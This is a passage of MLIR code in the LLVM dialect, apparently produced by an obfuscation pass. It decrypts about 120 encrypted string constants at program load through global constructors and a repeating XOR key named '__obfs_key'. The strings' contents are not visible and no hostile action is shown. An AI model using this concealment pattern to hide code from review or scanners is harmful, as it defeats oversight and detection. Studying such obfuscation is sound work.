    %11 = llvm.call @f_658275b5bcb4(%9, %10) : (!llvm.ptr, i64) -> !llvm.ptr
    %12 = llvm.mlir.addressof @".str.4.enc" : !llvm.ptr
    %13 = llvm.mlir.constant(36 : i64) : i64
    %14 = llvm.call @f_658275b5bcb4(%12, %13) : (!llvm.ptr, i64) -> !llvm.ptr
    %15 = llvm.mlir.addressof @".str.5.enc" : !llvm.ptr
    %16 = llvm.mlir.constant(21 : i64) : i64
    %17 = llvm.call @f_658275b5bcb4(%15, %16) : (!llvm.ptr, i64) -> !llvm.ptr
    %18 = llvm.mlir.addressof @".str.6.enc" : !llvm.ptr
    %19 = llvm.mlir.constant(31 : i64) : i64
    %20 = llvm.call @f_658275b5bcb4(%18, %19) : (!llvm.ptr, i64) -> !llvm.ptr
    %21 = llvm.mlir.addressof @".str.7.enc" : !llvm.ptr
    %22 = llvm.mlir.constant(30 : i64) : i64
    %23 = llvm.call @f_658275b5bcb4(%21, %22) : (!llvm.ptr, i64) -> !llvm.ptr
    %24 = llvm.mlir.addressof @".str.8.enc" : !llvm.ptr
    %25 = llvm.mlir.constant(38 : i64) : i64
    %26 = llvm.call @f_658275b5bcb4(%24, %25) : (!llvm.ptr, i64) -> !llvm.ptr
    %27 = llvm.mlir.addressof @".str.9.enc" : !llvm.ptr
    %28 = llvm.mlir.constant(41 : i64) : i64
    %29 = llvm.call @f_658275b5bcb4(%27, %28) : (!llvm.ptr, i64) -> !llvm.ptr
    %30 = llvm.mlir.addressof @".str.10.enc" : !llvm.ptr
    %31 = llvm.mlir.constant(23 : i64) : i64
    %32 = llvm.call @f_658275b5bcb4(%30, %31) : (!llvm.ptr, i64) -> !llvm.ptr
    %33 = llvm.mlir.addressof @".str.11.enc" : !llvm.ptr
    %34 = llvm.mlir.constant(26 : i64) : i64
    %35 = llvm.call @f_658275b5bcb4(%33, %34) : (!llvm.ptr, i64) -> !llvm.ptr
    %36 = llvm.mlir.addressof @".str.12.enc" : !llvm.ptr
    %37 = llvm.mlir.constant(32 : i64) : i64
    %38 = llvm.call @f_658275b5bcb4(%36, %37) : (!llvm.ptr, i64) -> !llvm.ptr
    %39 = llvm.mlir.addressof @".str.13.enc" : !llvm.ptr
    %40 = llvm.mlir.constant(29 : i64) : i64
    %41 = llvm.call @f_658275b5bcb4(%39, %40) : (!llvm.ptr, i64) -> !llvm.ptr
    %42 = llvm.mlir.addressof @".str.14.enc" : !llvm.ptr
    %43 = llvm.mlir.constant(12 : i64) : i64
    %44 = llvm.call @f_658275b5bcb4(%42, %43) : (!llvm.ptr, i64) -> !llvm.ptr
    %45 = llvm.mlir.addressof @".str.15.enc" : !llvm.ptr
    %46 = llvm.mlir.constant(29 : i64) : i64
    %47 = llvm.call @f_658275b5bcb4(%45, %46) : (!llvm.ptr, i64) -> !llvm.ptr
    %48 = llvm.mlir.addressof @".str.16.enc" : !llvm.ptr
    %49 = llvm.mlir.constant(35 : i64) : i64
    %50 = llvm.call @f_658275b5bcb4(%48, %49) : (!llvm.ptr, i64) -> !llvm.ptr
    %51 = llvm.mlir.addressof @".str.17.enc" : !llvm.ptr
    %52 = llvm.mlir.constant(40 : i64) : i64
    %53 = llvm.call @f_658275b5bcb4(%51, %52) : (!llvm.ptr, i64) -> !llvm.ptr
    %54 = llvm.mlir.addressof @".str.18.enc" : !llvm.ptr
    %55 = llvm.mlir.constant(1 : i64) : i64
    %56 = llvm.call @f_658275b5bcb4(%54, %55) : (!llvm.ptr, i64) -> !llvm.ptr
    %57 = llvm.mlir.addressof @".str.19.enc" : !llvm.ptr
    %58 = llvm.mlir.constant(26 : i64) : i64
    %59 = llvm.call @f_658275b5bcb4(%57, %58) : (!llvm.ptr, i64) -> !llvm.ptr
    %60 = llvm.mlir.addressof @".str.20.enc" : !llvm.ptr
    %61 = llvm.mlir.constant(33 : i64) : i64
    %62 = llvm.call @f_658275b5bcb4(%60, %61) : (!llvm.ptr, i64) -> !llvm.ptr
    %63 = llvm.mlir.addressof @".str.21.enc" : !llvm.ptr
    %64 = llvm.mlir.constant(29 : i64) : i64
    %65 = llvm.call @f_658275b5bcb4(%63, %64) : (!llvm.ptr, i64) -> !llvm.ptr
    %66 = llvm.mlir.addressof @".str.22.enc" : !llvm.ptr
    %67 = llvm.mlir.constant(37 : i64) : i64
    %68 = llvm.call @f_658275b5bcb4(%66, %67) : (!llvm.ptr, i64) -> !llvm.ptr
    %69 = llvm.mlir.addressof @".str.23.enc" : !llvm.ptr
    %70 = llvm.mlir.constant(29 : i64) : i64
    %71 = llvm.call @f_658275b5bcb4(%69, %70) : (!llvm.ptr, i64) -> !llvm.ptr
    %72 = llvm.mlir.addressof @".str.24.enc" : !llvm.ptr
    %73 = llvm.mlir.constant(29 : i64) : i64
    %74 = llvm.call @f_658275b5bcb4(%72, %73) : (!llvm.ptr, i64) -> !llvm.ptr
    %75 = llvm.mlir.addressof @".str.25.enc" : !llvm.ptr
    %76 = llvm.mlir.constant(38 : i64) : i64
    %77 = llvm.call @f_658275b5bcb4(%75, %76) : (!llvm.ptr, i64) -> !llvm.ptr
    %78 = llvm.mlir.addressof @".str.26.enc" : !llvm.ptr
    %79 = llvm.mlir.constant(23 : i64) : i64
    %80 = llvm.call @f_658275b5bcb4(%78, %79) : (!llvm.ptr, i64) -> !llvm.ptr
    %81 = llvm.mlir.addressof @".str.27.enc" : !llvm.ptr
    %82 = llvm.mlir.constant(7 : i64) : i64
    %83 = llvm.call @f_658275b5bcb4(%81, %82) : (!llvm.ptr, i64) -> !llvm.ptr
    %84 = llvm.mlir.addressof @".str.28.enc" : !llvm.ptr
    %85 = llvm.mlir.constant(32 : i64) : i64
    %86 = llvm.call @f_658275b5bcb4(%84, %85) : (!llvm.ptr, i64) -> !llvm.ptr
    %87 = llvm.mlir.addressof @".str.29.enc" : !llvm.ptr
    %88 = llvm.mlir.constant(29 : i64) : i64
    %89 = llvm.call @f_658275b5bcb4(%87, %88) : (!llvm.ptr, i64) -> !llvm.ptr
    %90 = llvm.mlir.addressof @".str.30.enc" : !llvm.ptr
    %91 = llvm.mlir.constant(2 : i64) : i64
    %92 = llvm.call @f_658275b5bcb4(%90, %91) : (!llvm.ptr, i64) -> !llvm.ptr
    %93 = llvm.mlir.addressof @".str.31.enc" : !llvm.ptr
    %94 = llvm.mlir.constant(28 : i64) : i64
    %95 = llvm.call @f_658275b5bcb4(%93, %94) : (!llvm.ptr, i64) -> !llvm.ptr
    %96 = llvm.mlir.addressof @".str.32.enc" : !llvm.ptr
    %97 = llvm.mlir.constant(29 : i64) : i64
    %98 = llvm.call @f_658275b5bcb4(%96, %97) : (!llvm.ptr, i64) -> !llvm.ptr
    %99 = llvm.mlir.addressof @".str.33.enc" : !llvm.ptr
    %100 = llvm.mlir.constant(45 : i64) : i64
    %101 = llvm.call @f_658275b5bcb4(%99, %100) : (!llvm.ptr, i64) -> !llvm.ptr
    %102 = llvm.mlir.addressof @".str.34.enc" : !llvm.ptr
    %103 = llvm.mlir.constant(40 : i64) : i64
    %104 = llvm.call @f_658275b5bcb4(%102, %103) : (!llvm.ptr, i64) -> !llvm.ptr
    %105 = llvm.mlir.addressof @".str.35.enc" : !llvm.ptr
    %106 = llvm.mlir.constant(16 : i64) : i64
    %107 = llvm.call @f_658275b5bcb4(%105, %106) : (!llvm.ptr, i64) -> !llvm.ptr
    %108 = llvm.mlir.addressof @".str.36.enc" : !llvm.ptr
    %109 = llvm.mlir.constant(16 : i64) : i64
    %110 = llvm.call @f_658275b5bcb4(%108, %109) : (!llvm.ptr, i64) -> !llvm.ptr
    %111 = llvm.mlir.addressof @".str.37.enc" : !llvm.ptr
    %112 = llvm.mlir.constant(14 : i64) : i64
    %113 = llvm.call @f_658275b5bcb4(%111, %112) : (!llvm.ptr, i64) -> !llvm.ptr
    %114 = llvm.mlir.addressof @".str.38.enc" : !llvm.ptr
    %115 = llvm.mlir.constant(41 : i64) : i64
    %116 = llvm.call @f_658275b5bcb4(%114, %115) : (!llvm.ptr, i64) -> !llvm.ptr
    %117 = llvm.mlir.addressof @".str.39.enc" : !llvm.ptr
    %118 = llvm.mlir.constant(26 : i64) : i64
    %119 = llvm.call @f_658275b5bcb4(%117, %118) : (!llvm.ptr, i64) -> !llvm.ptr
    %120 = llvm.mlir.addressof @".str.40.enc" : !llvm.ptr
    %121 = llvm.mlir.constant(20 : i64) : i64
    %122 = llvm.call @f_658275b5bcb4(%120, %121) : (!llvm.ptr, i64) -> !llvm.ptr
    %123 = llvm.mlir.addressof @".str.41.enc" : !llvm.ptr
    %124 = llvm.mlir.constant(26 : i64) : i64
    %125 = llvm.call @f_658275b5bcb4(%123, %124) : (!llvm.ptr, i64) -> !llvm.ptr
    %126 = llvm.mlir.addressof @".str.42.enc" : !llvm.ptr
    %127 = llvm.mlir.constant(20 : i64) : i64
    %128 = llvm.call @f_658275b5bcb4(%126, %127) : (!llvm.ptr, i64) -> !llvm.ptr
    %129 = llvm.mlir.addressof @".str.43.enc" : !llvm.ptr
    %130 = llvm.mlir.constant(24 : i64) : i64
    %131 = llvm.call @f_658275b5bcb4(%129, %130) : (!llvm.ptr, i64) -> !llvm.ptr
    %132 = llvm.mlir.addressof @".str.44.enc" : !llvm.ptr
    %133 = llvm.mlir.constant(18 : i64) : i64
    %134 = llvm.call @f_658275b5bcb4(%132, %133) : (!llvm.ptr, i64) -> !llvm.ptr
    %135 = llvm.mlir.addressof @".str.45.enc" : !llvm.ptr
    %136 = llvm.mlir.constant(28 : i64) : i64
    %137 = llvm.call @f_658275b5bcb4(%135, %136) : (!llvm.ptr, i64) -> !llvm.ptr
    %138 = llvm.mlir.addressof @".str.46.enc" : !llvm.ptr
    %139 = llvm.mlir.constant(27 : i64) : i64
    %140 = llvm.call @f_658275b5bcb4(%138, %139) : (!llvm.ptr, i64) -> !llvm.ptr
    %141 = llvm.mlir.addressof @".str.47.enc" : !llvm.ptr
    %142 = llvm.mlir.constant(31 : i64) : i64
    %143 = llvm.call @f_658275b5bcb4(%141, %142) : (!llvm.ptr, i64) -> !llvm.ptr
    %144 = llvm.mlir.addressof @".str.48.enc" : !llvm.ptr
    %145 = llvm.mlir.constant(22 : i64) : i64
    %146 = llvm.call @f_658275b5bcb4(%144, %145) : (!llvm.ptr, i64) -> !llvm.ptr
    %147 = llvm.mlir.addressof @".str.49.enc" : !llvm.ptr
    %148 = llvm.mlir.constant(22 : i64) : i64
    %149 = llvm.call @f_658275b5bcb4(%147, %148) : (!llvm.ptr, i64) -> !llvm.ptr
    %150 = llvm.mlir.addressof @".str.50.enc" : !llvm.ptr
    %151 = llvm.mlir.constant(40 : i64) : i64
    %152 = llvm.call @f_658275b5bcb4(%150, %151) : (!llvm.ptr, i64) -> !llvm.ptr
    %153 = llvm.mlir.addressof @".str.51.enc" : !llvm.ptr
    %154 = llvm.mlir.constant(31 : i64) : i64
    %155 = llvm.call @f_658275b5bcb4(%153, %154) : (!llvm.ptr, i64) -> !llvm.ptr
    %156 = llvm.mlir.addressof @".str.52.enc" : !llvm.ptr
    %157 = llvm.mlir.constant(7 : i64) : i64
    %158 = llvm.call @f_658275b5bcb4(%156, %157) : (!llvm.ptr, i64) -> !llvm.ptr
    %159 = llvm.mlir.addressof @".str.53.enc" : !llvm.ptr
    %160 = llvm.mlir.constant(31 : i64) : i64
    %161 = llvm.call @f_658275b5bcb4(%159, %160) : (!llvm.ptr, i64) -> !llvm.ptr
    %162 = llvm.mlir.addressof @".str.54.enc" : !llvm.ptr
    %163 = llvm.mlir.constant(24 : i64) : i64
    %164 = llvm.call @f_658275b5bcb4(%162, %163) : (!llvm.ptr, i64) -> !llvm.ptr
    %165 = llvm.mlir.addressof @".str.55.enc" : !llvm.ptr
    %166 = llvm.mlir.constant(25 : i64) : i64
    %167 = llvm.call @f_658275b5bcb4(%165, %166) : (!llvm.ptr, i64) -> !llvm.ptr
    %168 = llvm.mlir.addressof @".str.56.enc" : !llvm.ptr
    %169 = llvm.mlir.constant(39 : i64) : i64
    %170 = llvm.call @f_658275b5bcb4(%168, %169) : (!llvm.ptr, i64) -> !llvm.ptr
    %171 = llvm.mlir.addressof @".str.57.enc" : !llvm.ptr
    %172 = llvm.mlir.constant(30 : i64) : i64
    %173 = llvm.call @f_658275b5bcb4(%171, %172) : (!llvm.ptr, i64) -> !llvm.ptr
    %174 = llvm.mlir.addressof @".str.58.enc" : !llvm.ptr
    %175 = llvm.mlir.constant(29 : i64) : i64
    %176 = llvm.call @f_658275b5bcb4(%174, %175) : (!llvm.ptr, i64) -> !llvm.ptr
    %177 = llvm.mlir.addressof @".str.59.enc" : !llvm.ptr
    %178 = llvm.mlir.constant(5 : i64) : i64
    %179 = llvm.call @f_658275b5bcb4(%177, %178) : (!llvm.ptr, i64) -> !llvm.ptr
    %180 = llvm.mlir.addressof @".str.60.enc" : !llvm.ptr
    %181 = llvm.mlir.constant(36 : i64) : i64
    %182 = llvm.call @f_658275b5bcb4(%180, %181) : (!llvm.ptr, i64) -> !llvm.ptr
    %183 = llvm.mlir.addressof @".str.61.enc" : !llvm.ptr
    %184 = llvm.mlir.constant(43 : i64) : i64
    %185 = llvm.call @f_658275b5bcb4(%183, %184) : (!llvm.ptr, i64) -> !llvm.ptr
    %186 = llvm.mlir.addressof @".str.62.enc" : !llvm.ptr
    %187 = llvm.mlir.constant(40 : i64) : i64
    %188 = llvm.call @f_658275b5bcb4(%186, %187) : (!llvm.ptr, i64) -> !llvm.ptr
    %189 = llvm.mlir.addressof @".str.63.enc" : !llvm.ptr
    %190 = llvm.mlir.constant(39 : i64) : i64
    %191 = llvm.call @f_658275b5bcb4(%189, %190) : (!llvm.ptr, i64) -> !llvm.ptr
    %192 = llvm.mlir.addressof @".str.64.enc" : !llvm.ptr
    %193 = llvm.mlir.constant(6 : i64) : i64
    %194 = llvm.call @f_658275b5bcb4(%192, %193) : (!llvm.ptr, i64) -> !llvm.ptr
    %195 = llvm.mlir.addressof @".str.65.enc" : !llvm.ptr
    %196 = llvm.mlir.constant(41 : i64) : i64
    %197 = llvm.call @f_658275b5bcb4(%195, %196) : (!llvm.ptr, i64) -> !llvm.ptr
    %198 = llvm.mlir.addressof @".str.66.enc" : !llvm.ptr
    %199 = llvm.mlir.constant(40 : i64) : i64
    %200 = llvm.call @f_658275b5bcb4(%198, %199) : (!llvm.ptr, i64) -> !llvm.ptr
    %201 = llvm.mlir.addressof @".str.67.enc" : !llvm.ptr
    %202 = llvm.mlir.constant(44 : i64) : i64
    %203 = llvm.call @f_658275b5bcb4(%201, %202) : (!llvm.ptr, i64) -> !llvm.ptr
    %204 = llvm.mlir.addressof @".str.68.enc" : !llvm.ptr
    %205 = llvm.mlir.constant(16 : i64) : i64
    %206 = llvm.call @f_658275b5bcb4(%204, %205) : (!llvm.ptr, i64) -> !llvm.ptr
    %207 = llvm.mlir.addressof @".str.69.enc" : !llvm.ptr
    %208 = llvm.mlir.constant(13 : i64) : i64
    %209 = llvm.call @f_658275b5bcb4(%207, %208) : (!llvm.ptr, i64) -> !llvm.ptr
    %210 = llvm.mlir.addressof @".str.70.enc" : !llvm.ptr
    %211 = llvm.mlir.constant(53 : i64) : i64
    %212 = llvm.call @f_658275b5bcb4(%210, %211) : (!llvm.ptr, i64) -> !llvm.ptr
    %213 = llvm.mlir.addressof @".str.71.enc" : !llvm.ptr
    %214 = llvm.mlir.constant(41 : i64) : i64
    %215 = llvm.call @f_658275b5bcb4(%213, %214) : (!llvm.ptr, i64) -> !llvm.ptr
    %216 = llvm.mlir.addressof @".str.72.enc" : !llvm.ptr
    %217 = llvm.mlir.constant(43 : i64) : i64
    %218 = llvm.call @f_658275b5bcb4(%216, %217) : (!llvm.ptr, i64) -> !llvm.ptr
    %219 = llvm.mlir.addressof @".str.73.enc" : !llvm.ptr
    %220 = llvm.mlir.constant(44 : i64) : i64
    %221 = llvm.call @f_658275b5bcb4(%219, %220) : (!llvm.ptr, i64) -> !llvm.ptr
    %222 = llvm.mlir.addressof @".str.74.enc" : !llvm.ptr
    %223 = llvm.mlir.constant(48 : i64) : i64
    %224 = llvm.call @f_658275b5bcb4(%222, %223) : (!llvm.ptr, i64) -> !llvm.ptr
    %225 = llvm.mlir.addressof @".str.75.enc" : !llvm.ptr
    %226 = llvm.mlir.constant(40 : i64) : i64
    %227 = llvm.call @f_658275b5bcb4(%225, %226) : (!llvm.ptr, i64) -> !llvm.ptr
    %228 = llvm.mlir.addressof @".str.76.enc" : !llvm.ptr
    %229 = llvm.mlir.constant(24 : i64) : i64
    %230 = llvm.call @f_658275b5bcb4(%228, %229) : (!llvm.ptr, i64) -> !llvm.ptr
    %231 = llvm.mlir.addressof @".str.77.enc" : !llvm.ptr
    %232 = llvm.mlir.constant(26 : i64) : i64
    %233 = llvm.call @f_658275b5bcb4(%231, %232) : (!llvm.ptr, i64) -> !llvm.ptr
    %234 = llvm.mlir.addressof @".str.78.enc" : !llvm.ptr
    %235 = llvm.mlir.constant(74 : i64) : i64
    %236 = llvm.call @f_658275b5bcb4(%234, %235) : (!llvm.ptr, i64) -> !llvm.ptr
    %237 = llvm.mlir.addressof @".str.79.enc" : !llvm.ptr
    %238 = llvm.mlir.constant(48 : i64) : i64
    %239 = llvm.call @f_658275b5bcb4(%237, %238) : (!llvm.ptr, i64) -> !llvm.ptr
    %240 = llvm.mlir.addressof @".str.80.enc" : !llvm.ptr
    %241 = llvm.mlir.constant(45 : i64) : i64
    %242 = llvm.call @f_658275b5bcb4(%240, %241) : (!llvm.ptr, i64) -> !llvm.ptr
    %243 = llvm.mlir.addressof @".str.81.enc" : !llvm.ptr
    %244 = llvm.mlir.constant(9 : i64) : i64
    %245 = llvm.call @f_658275b5bcb4(%243, %244) : (!llvm.ptr, i64) -> !llvm.ptr
    %246 = llvm.mlir.addressof @".str.82.enc" : !llvm.ptr
    %247 = llvm.mlir.constant(7 : i64) : i64
    %248 = llvm.call @f_658275b5bcb4(%246, %247) : (!llvm.ptr, i64) -> !llvm.ptr
    %249 = llvm.mlir.addressof @".str.83.enc" : !llvm.ptr
    %250 = llvm.mlir.constant(12 : i64) : i64
    %251 = llvm.call @f_658275b5bcb4(%249, %250) : (!llvm.ptr, i64) -> !llvm.ptr
    %252 = llvm.mlir.addressof @".str.84.enc" : !llvm.ptr
    %253 = llvm.mlir.constant(27 : i64) : i64
    %254 = llvm.call @f_658275b5bcb4(%252, %253) : (!llvm.ptr, i64) -> !llvm.ptr
    %255 = llvm.mlir.addressof @".str.85.enc" : !llvm.ptr
    %256 = llvm.mlir.constant(28 : i64) : i64
    %257 = llvm.call @f_658275b5bcb4(%255, %256) : (!llvm.ptr, i64) -> !llvm.ptr
    %258 = llvm.mlir.addressof @".str.86.enc" : !llvm.ptr
    %259 = llvm.mlir.constant(21 : i64) : i64
    %260 = llvm.call @f_658275b5bcb4(%258, %259) : (!llvm.ptr, i64) -> !llvm.ptr
    %261 = llvm.mlir.addressof @".str.87.enc" : !llvm.ptr
    %262 = llvm.mlir.constant(33 : i64) : i64
    %263 = llvm.call @f_658275b5bcb4(%261, %262) : (!llvm.ptr, i64) -> !llvm.ptr
    %264 = llvm.mlir.addressof @".str.88.enc" : !llvm.ptr
    %265 = llvm.mlir.constant(26 : i64) : i64
    %266 = llvm.call @f_658275b5bcb4(%264, %265) : (!llvm.ptr, i64) -> !llvm.ptr
    %267 = llvm.mlir.addressof @".str.89.enc" : !llvm.ptr
    %268 = llvm.mlir.constant(23 : i64) : i64
    %269 = llvm.call @f_658275b5bcb4(%267, %268) : (!llvm.ptr, i64) -> !llvm.ptr
    %270 = llvm.mlir.addressof @".str.90.enc" : !llvm.ptr
    %271 = llvm.mlir.constant(25 : i64) : i64
    %272 = llvm.call @f_658275b5bcb4(%270, %271) : (!llvm.ptr, i64) -> !llvm.ptr
    %273 = llvm.mlir.addressof @".str.91.enc" : !llvm.ptr
    %274 = llvm.mlir.constant(30 : i64) : i64
    %275 = llvm.call @f_658275b5bcb4(%273, %274) : (!llvm.ptr, i64) -> !llvm.ptr
    %276 = llvm.mlir.addressof @".str.92.enc" : !llvm.ptr
    %277 = llvm.mlir.constant(29 : i64) : i64
    %278 = llvm.call @f_658275b5bcb4(%276, %277) : (!llvm.ptr, i64) -> !llvm.ptr
    %279 = llvm.mlir.addressof @".str.93.enc" : !llvm.ptr
    %280 = llvm.mlir.constant(31 : i64) : i64
    %281 = llvm.call @f_658275b5bcb4(%279, %280) : (!llvm.ptr, i64) -> !llvm.ptr
    %282 = llvm.mlir.addressof @".str.94.enc" : !llvm.ptr
    %283 = llvm.mlir.constant(7 : i64) : i64
    %284 = llvm.call @f_658275b5bcb4(%282, %283) : (!llvm.ptr, i64) -> !llvm.ptr
    %285 = llvm.mlir.addressof @".str.95.enc" : !llvm.ptr
    %286 = llvm.mlir.constant(29 : i64) : i64
    %287 = llvm.call @f_658275b5bcb4(%285, %286) : (!llvm.ptr, i64) -> !llvm.ptr
    %288 = llvm.mlir.addressof @".str.96.enc" : !llvm.ptr
    %289 = llvm.mlir.constant(8 : i64) : i64
    %290 = llvm.call @f_658275b5bcb4(%288, %289) : (!llvm.ptr, i64) -> !llvm.ptr
    %291 = llvm.mlir.addressof @".str.97.enc" : !llvm.ptr
    %292 = llvm.mlir.constant(30 : i64) : i64
    %293 = llvm.call @f_658275b5bcb4(%291, %292) : (!llvm.ptr, i64) -> !llvm.ptr
    %294 = llvm.mlir.addressof @".str.98.enc" : !llvm.ptr
    %295 = llvm.mlir.constant(31 : i64) : i64
    %296 = llvm.call @f_658275b5bcb4(%294, %295) : (!llvm.ptr, i64) -> !llvm.ptr
    %297 = llvm.mlir.addressof @".str.99.enc" : !llvm.ptr
    %298 = llvm.mlir.constant(32 : i64) : i64
    %299 = llvm.call @f_658275b5bcb4(%297, %298) : (!llvm.ptr, i64) -> !llvm.ptr
    %300 = llvm.mlir.addressof @".str.100.enc" : !llvm.ptr
    %301 = llvm.mlir.constant(16 : i64) : i64
    %302 = llvm.call @f_658275b5bcb4(%300, %301) : (!llvm.ptr, i64) -> !llvm.ptr
    %303 = llvm.mlir.addressof @".str.101.enc" : !llvm.ptr
    %304 = llvm.mlir.constant(8 : i64) : i64
    %305 = llvm.call @f_658275b5bcb4(%303, %304) : (!llvm.ptr, i64) -> !llvm.ptr
    %306 = llvm.mlir.addressof @".str.102.enc" : !llvm.ptr
    %307 = llvm.mlir.constant(25 : i64) : i64
    %308 = llvm.call @f_658275b5bcb4(%306, %307) : (!llvm.ptr, i64) -> !llvm.ptr
    %309 = llvm.mlir.addressof @".str.103.enc" : !llvm.ptr
    %310 = llvm.mlir.constant(26 : i64) : i64
    %311 = llvm.call @f_658275b5bcb4(%309, %310) : (!llvm.ptr, i64) -> !llvm.ptr
    %312 = llvm.mlir.addressof @".str.104.enc" : !llvm.ptr
    %313 = llvm.mlir.constant(26 : i64) : i64
    %314 = llvm.call @f_658275b5bcb4(%312, %313) : (!llvm.ptr, i64) -> !llvm.ptr
    %315 = llvm.mlir.addressof @".str.105.enc" : !llvm.ptr
    %316 = llvm.mlir.constant(9 : i64) : i64
    %317 = llvm.call @f_658275b5bcb4(%315, %316) : (!llvm.ptr, i64) -> !llvm.ptr
    %318 = llvm.mlir.addressof @".str.106.enc" : !llvm.ptr
    %319 = llvm.mlir.constant(29 : i64) : i64
    %320 = llvm.call @f_658275b5bcb4(%318, %319) : (!llvm.ptr, i64) -> !llvm.ptr
    %321 = llvm.mlir.addressof @".str.107.enc" : !llvm.ptr
    %322 = llvm.mlir.constant(60 : i64) : i64
    %323 = llvm.call @f_658275b5bcb4(%321, %322) : (!llvm.ptr, i64) -> !llvm.ptr
    %324 = llvm.mlir.addressof @".str.108.enc" : !llvm.ptr
    %325 = llvm.mlir.constant(37 : i64) : i64
    %326 = llvm.call @f_658275b5bcb4(%324, %325) : (!llvm.ptr, i64) -> !llvm.ptr
    %327 = llvm.mlir.addressof @".str.109.enc" : !llvm.ptr
    %328 = llvm.mlir.constant(36 : i64) : i64
    %329 = llvm.call @f_658275b5bcb4(%327, %328) : (!llvm.ptr, i64) -> !llvm.ptr
    %330 = llvm.mlir.addressof @".str.110.enc" : !llvm.ptr
    %331 = llvm.mlir.constant(29 : i64) : i64
    %332 = llvm.call @f_658275b5bcb4(%330, %331) : (!llvm.ptr, i64) -> !llvm.ptr
    %333 = llvm.mlir.addressof @".str.111.enc" : !llvm.ptr
    %334 = llvm.mlir.constant(187 : i64) : i64
    %335 = llvm.call @f_658275b5bcb4(%333, %334) : (!llvm.ptr, i64) -> !llvm.ptr
    %336 = llvm.mlir.addressof @".str.112.enc" : !llvm.ptr
    %337 = llvm.mlir.constant(66 : i64) : i64
    %338 = llvm.call @f_658275b5bcb4(%336, %337) : (!llvm.ptr, i64) -> !llvm.ptr
    %339 = llvm.mlir.addressof @".str.113.enc" : !llvm.ptr
    %340 = llvm.mlir.constant(65 : i64) : i64
    %341 = llvm.call @f_658275b5bcb4(%339, %340) : (!llvm.ptr, i64) -> !llvm.ptr
    %342 = llvm.mlir.addressof @".str.114.enc" : !llvm.ptr
    %343 = llvm.mlir.constant(187 : i64) : i64
    %344 = llvm.call @f_658275b5bcb4(%342, %343) : (!llvm.ptr, i64) -> !llvm.ptr
    %345 = llvm.mlir.addressof @".str.115.enc" : !llvm.ptr
    %346 = llvm.mlir.constant(12 : i64) : i64
    %347 = llvm.call @f_658275b5bcb4(%345, %346) : (!llvm.ptr, i64) -> !llvm.ptr
    %348 = llvm.mlir.addressof @".str.116.enc" : !llvm.ptr
    %349 = llvm.mlir.constant(33 : i64) : i64
    %350 = llvm.call @f_658275b5bcb4(%348, %349) : (!llvm.ptr, i64) -> !llvm.ptr
    %351 = llvm.mlir.addressof @".str.117.enc" : !llvm.ptr
    %352 = llvm.mlir.constant(36 : i64) : i64
    %353 = llvm.call @f_658275b5bcb4(%351, %352) : (!llvm.ptr, i64) -> !llvm.ptr
    %354 = llvm.mlir.addressof @".str.118.enc" : !llvm.ptr
    %355 = llvm.mlir.constant(23 : i64) : i64
    %356 = llvm.call @f_658275b5bcb4(%354, %355) : (!llvm.ptr, i64) -> !llvm.ptr
    %357 = llvm.mlir.addressof @".str.119.enc" : !llvm.ptr
    %358 = llvm.mlir.constant(18 : i64) : i64
    %359 = llvm.call @f_658275b5bcb4(%357, %358) : (!llvm.ptr, i64) -> !llvm.ptr
    %360 = llvm.mlir.addressof @".str.120.enc" : !llvm.ptr
    %361 = llvm.mlir.constant(19 : i64) : i64
    %362 = llvm.call @f_658275b5bcb4(%360, %361) : (!llvm.ptr, i64) -> !llvm.ptr
    %363 = llvm.mlir.addressof @".str.121.enc" : !llvm.ptr
    %364 = llvm.mlir.constant(20 : i64) : i64
    %365 = llvm.call @f_658275b5bcb4(%363, %364) : (!llvm.ptr, i64) -> !llvm.ptr
    %366 = llvm.mlir.addressof @".str.122.enc" : !llvm.ptr
    %367 = llvm.mlir.constant(18 : i64) : i64
    %368 = llvm.call @f_658275b5bcb4(%366, %367) : (!llvm.ptr, i64) -> !llvm.ptr
    llvm.return
  }
  llvm.mlir.global_ctors ctors = [@f_727aafa85828, @f_9d45a1b88c2b], priorities = [101 : i32, 101 : i32], data = [#llvm.zero, #llvm.zero]
  llvm.func internal @f_31aa28e0a945(%arg0: !llvm.ptr, %arg1: i32) attributes {no_inline} {
    %0 = llvm.mlir.addressof @__obfs_key : !llvm.ptr
    %1 = llvm.mlir.constant(0 : i32) : i32
    %2 = llvm.mlir.constant(1 : i32) : i32
    %3 = llvm.mlir.constant(11 : i32) : i32
    %4 = llvm.alloca %2 x i32 : (i32) -> !llvm.ptr
    llvm.store %1, %4 : i32, !llvm.ptr
    llvm.br ^bb1
  ^bb1:  // 2 preds: ^bb0, ^bb2
    %5 = llvm.load %4 : !llvm.ptr -> i32
    %6 = llvm.icmp "slt" %5, %arg1 : i32
    llvm.cond_br %6, ^bb2, ^bb3
  ^bb2:  // pred: ^bb1
    %7 = llvm.load %4 : !llvm.ptr -> i32
    %8 = llvm.sext %7 : i32 to i64
    %9 = llvm.getelementptr %arg0[%8] : (!llvm.ptr, i64) -> !llvm.ptr, i8
    %10 = llvm.load %9 : !llvm.ptr -> i8
    %11 = llvm.srem %7, %3 : i32
    %12 = llvm.sext %11 : i32 to i64
    %13 = llvm.getelementptr %0[%12] : (!llvm.ptr, i64) -> !llvm.ptr, i8
    %14 = llvm.load %13 : !llvm.ptr -> i8
    %15 = llvm.xor %10, %14 : i8
    llvm.store %15, %9 : i8, !llvm.ptr
    %16 = llvm.add %7, %2 : i32
    llvm.store %16, %4 : i32, !llvm.ptr
    llvm.br ^bb1
  ^bb3:  // pred: ^bb1
    llvm.return
  }
  llvm.func internal @f_9d45a1b88c2b() attributes {no_inline} {
    %0 = llvm.mlir.constant(50 : i32) : i32
    %1 = llvm.mlir.addressof @".str.0.enc" : !llvm.ptr
    llvm.call @f_31aa28e0a945(%1, %0) : (!llvm.ptr, i32) -> ()
    %2 = llvm.mlir.constant(37 : i32) : i32
    %3 = llvm.mlir.addressof @".str.1.enc" : !llvm.ptr
    llvm.call @f_31aa28e0a945(%3, %2) : (!llvm.ptr, i32) -> ()
    %4 = llvm.mlir.constant(30 : i32) : i32
    %5 = llvm.mlir.addressof @".str.2.enc" : !llvm.ptr
    llvm.call @f_31aa28e0a945(%5, %4) : (!llvm.ptr, i32) -> ()
    %6 = llvm.mlir.constant(41 : i32) : i32
    %7 = llvm.mlir.addressof @".str.3.enc" : !llvm.ptr
    llvm.call @f_31aa28e0a945(%7, %6) : (!llvm.ptr, i32) -> ()
    %8 = llvm.mlir.constant(36 : i32) : i32
    %9 = llvm.mlir.addressof @".str.4.enc" : !llvm.ptr
    llvm.call @f_31aa28e0a945(%9, %8) : (!llvm.ptr, i32) -> ()
